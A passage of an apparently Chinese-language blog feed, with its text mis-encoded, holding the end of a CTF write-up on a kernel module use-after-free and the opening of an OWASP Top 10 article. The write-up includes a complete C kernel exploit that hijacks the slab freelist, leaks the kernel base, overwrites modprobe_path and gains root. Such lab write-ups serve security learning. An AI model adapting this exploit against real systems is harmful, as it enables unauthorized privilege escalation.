punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡åˆ†æï¼Œä¼ å…¥çš„ç»“æ„ä½“åº”ä¸ºï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> offset<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨å…³é—­è®¾å¤‡æ—¶ä¼šé‡Šæ”¾æ‰bufï¼Œä½†æ²¡æœ‰ç½®ç©ºï¼Œå­˜åœ¨cacheçš„UAF</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">xkmod_release</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">kmem_cache_free</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äºŒã€åˆ©ç”¨æ€è·¯"><a href="#äºŒã€åˆ©ç”¨æ€è·¯" class="headerlink" title="äºŒã€åˆ©ç”¨æ€è·¯"></a>äºŒã€åˆ©ç”¨æ€è·¯</h2><p>åŒæ—¶æ‰“å¼€ä¸¤ä¸ªè®¾å¤‡å°±èƒ½å®ç°UAFï¼Œç”šè‡³ä¸éœ€è¦ioctlæœªä¸Šé”çš„æ¼æ´</p><ol><li>å®ç°å†…æ ¸ä»»æ„åœ°å€å†™<br>freelist éšæœºåŒ–ä¿æŠ¤å¹¶éæ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ä¿æŠ¤ï¼Œè€Œæ˜¯åœ¨ä¸º slub åˆ†é…é¡µé¢æ—¶ä¼šå°†é¡µé¢å†…çš„ object æŒ‡é’ˆéšæœºæ‰“ä¹±ï¼Œ<strong>ä½†æ˜¯åœ¨åé¢çš„åˆ†é…é‡Šæ”¾ä¸­ä¾ç„¶éµå¾ªç€LIFOçš„åŸåˆ™</strong>ã€‚</li></ol><p>æˆ‘ä»¬å¯ä»¥å…ˆè·å¾—ä¸€ä¸ª object çš„ UAFï¼Œä¿®æ”¹å…¶ next ä¸ºæˆ‘ä»¬æƒ³è¦åˆ†é…çš„åœ°å€ï¼Œä¹‹åæˆ‘ä»¬è¿ç»­è¿›è¡Œä¸¤æ¬¡åˆ†é…ä¾¿èƒ½å¤ŸæˆåŠŸè·å¾—ç›®æ ‡åœ°å€ä¸Šçš„ object ï¼Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚</p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“æˆ‘ä»¬åˆ†é…åˆ°ç›®æ ‡åœ°å€æ—¶<strong>ç›®æ ‡åœ°å€å‰ 8 å­—èŠ‚çš„æ•°æ®ä¼šè¢«å†™å…¥ freelistï¼Œè€Œè¿™é€šå¸¸å¹¶éä¸€ä¸ªæœ‰æ•ˆçš„åœ°å€</strong>ï¼Œä»è€Œå¯¼è‡´ kernel panicã€‚æˆ‘ä»¬åº”å½“å°½é‡é€‰å–ç›®æ ‡åœ°å€å¾€å‰çš„ä¸€ä¸ªæœ‰ç€ 8 å­—èŠ‚ 0 çš„åŒºåŸŸï¼Œä»è€Œä½¿å¾— freelist è·å¾—ä¸€ä¸ª NULL æŒ‡é’ˆï¼Œä¿ƒä½¿ kmem_cache å‘ buddy system è¯·æ±‚ä¸€ä¸ªæ–°çš„ slubï¼Œè¿™æ ·å°±ä¸ä¼šå‘ç”Ÿ crashã€‚</p><ol start="2"><li>æ³„éœ²å†…æ ¸åŸºå€<br>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ³„éœ²å†…æ ¸åŸºå€ï¼Œåœ¨å†…æ ¸â€œå †åŸºå€â€ï¼ˆpage_offset_baseï¼‰ + 0x9d000 å¤„å­˜æ”¾ç€ <code>secondary_startup_64</code> å‡½æ•°çš„åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥ä» free object çš„ next æŒ‡é’ˆè·å¾—ä¸€ä¸ªå †ä¸Šåœ°å€ï¼Œä»è€Œå»çŒœæµ‹å †çš„åŸºå€ï¼Œä¹‹ååˆ†é…åˆ°ä¸€ä¸ª <code>å †åŸºå€ + 0x9d000</code> å¤„çš„ object ä»¥æ³„éœ²å†…æ ¸åŸºå€<br><img src="/EXP_FILE/c4f5ab23f1217b0d487747a84e7241b1_MD5.jpeg"></li></ol><p>é€šè¿‡è°ƒè¯•ï¼Œå¼€å¯kaslråï¼Œpage_fault_baseç”±<code>0xffff888000000000 -&gt; 0xffffa2f540000000</code>ï¼Œæˆ‘ä»¬æˆªå–å‰9ä½</p><ol start="3"><li>åŠ«æŒå†…æ ¸æ‰§è¡Œæµ<br>æˆ‘é€‰æ‹©è¦†å†™Â <code>modprobe_path</code>Â ä»è€Œä»¥ root æ‰§è¡Œgetflagç¨‹åº</li></ol><h2 id="ä¸‰ã€EXP"><a href="#ä¸‰ã€EXP" class="headerlink" title="ä¸‰ã€EXP"></a>ä¸‰ã€EXP</h2><h3 id="EXP-modprobe-path"><a href="#EXP-modprobe-path" class="headerlink" title="EXP-modprobe_path"></a>EXP-modprobe_path</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0x7777777</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0x6666666</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0x1111111</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MODPROBE_PATH</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff82444700</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> offset<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">;</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* to run the exp on the specific core only */</span><span class="token keyword">void</span> <span class="token function">bindCore</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set cpu affinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_ADD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> offset<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>req<span class="token punctuation">.</span>offset <span class="token operator">=</span> offset<span class="token punctuation">;</span>req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_SET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> offset<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>req<span class="token punctuation">.</span>offset <span class="token operator">=</span> offset<span class="token punctuation">;</span>req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_GET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bindCore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* UAF1 */</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] ------UAF1------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/xkmod"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd1<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev1 Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/xkmod"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd2<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev2 Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[-] Dev1 Closed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">get</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>leak <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">;</span><span class="token class-name">size_t</span> kheap <span class="token operator">=</span> leak <span class="token operator">&amp;</span> <span class="token number">0xfffffffff0000000</span> <span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] kheap => 0x%lx\n"</span><span class="token punctuation">,</span> kheap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> kheap<span class="token operator">+</span><span class="token number">0x9d000</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">;</span><span class="token comment">//next->0xffff888005e529c0</span><span class="token function">set</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">get</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>leak <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>leak<span class="token operator">&amp;</span><span class="token number">0xffffffff00000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xffffffff00000000</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to leak"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak<span class="token operator">-</span><span class="token number">0xffffffff81000030</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* UAF2 */</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] ------UAF2------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd3 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/xkmod"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd3<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev3 Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd4 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/xkmod"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd4<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev4 Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[-] Dev3 Closed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> MODPROBE_PATH<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">;</span><span class="token function">set</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"/home/getflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '#!/bin/sh\n/bin/chmod 777 /flag' > /home/getflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /home/getflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '\\xff\\xff\\xff\\xff' > /home/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /home/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> flag_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to chmod flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/e68c51cce1233afc601332d12b0295fe_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OWASP Top10-2021</title>
      <link href="/2024/03/18/OWASP%20Top10-2021/"/>
      <url>/2024/03/18/OWASP%20Top10-2021/</url>
      
        <content type="html"><![CDATA[<p><img src="/PenTest_FILE/62b245fc43da713b2baaf5cdbc83d61b_MD5.jpeg"><br><strong>å¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®</strong>ï¼ˆ<strong>OWASP</strong>ï¼‰æ˜¯ä¸€ä¸ªåœ¨çº¿ç¤¾åŒºï¼Œåœ¨<a href="https://zh.wikipedia.org/w/index.php?title=Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8&action=edit&redlink=1">Webåº”ç”¨å®‰å…¨</a>é¢†åŸŸæä¾›å…è´¹çš„æ–‡ç« ï¼Œæ–¹æ³•ï¼Œæ–‡æ¡£ï¼Œå·¥å…·å’ŒæŠ€æœ¯ã€‚â€”â€“æ‘˜è‡ªç»´åŸºç™¾ç§‘</p><h1 id="ä¸€ã€è®¿é—®æ§åˆ¶æ¼æ´"><a href="#ä¸€ã€è®¿é—®æ§åˆ¶æ¼æ´" class="headerlink" title="ä¸€ã€è®¿é—®æ§åˆ¶æ¼æ´"></a>ä¸€ã€è®¿é—®æ§åˆ¶æ¼æ´</h1><p>ç½‘ç«™çš„é¡µé¢å—åˆ°ä¿æŠ¤ï¼Œä¸ä¼šè¢«æ™®é€šè®¿é—®è€…è®¿é—®ã€‚ä¾‹å¦‚ï¼Œåªæœ‰ç«™ç‚¹çš„ç®¡ç†å‘˜ç”¨æˆ·åº”è¯¥èƒ½å¤Ÿè®¿é—®é¡µé¢æ¥ç®¡ç†å…¶ä»–ç”¨æˆ·ã€‚å¦‚æœç½‘ç«™è®¿é—®è€…å¯ä»¥è®¿é—®ä»–ä»¬ä¸åº”è¯¥çœ‹åˆ°çš„å—ä¿æŠ¤é¡µé¢ï¼Œé‚£ä¹ˆè®¿é—®æ§åˆ¶å°±ä¼šè¢«ç ´åã€‚</p><p>æ™®é€šè®¿é—®è€…èƒ½å¤Ÿè®¿é—®å—ä¿æŠ¤çš„é¡µé¢å¯èƒ½ä¼šå¯¼è‡´ä»¥ä¸‹æƒ…å†µï¼š</p><ul><li>èƒ½å¤ŸæŸ¥çœ‹å…¶ä»–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯</li><li>è®¿é—®æœªç»æˆæƒçš„åŠŸèƒ½</li></ul><h2 id="IDOR"><a href="#IDOR" class="headerlink" title="IDOR"></a>IDOR</h2><p>IDOR 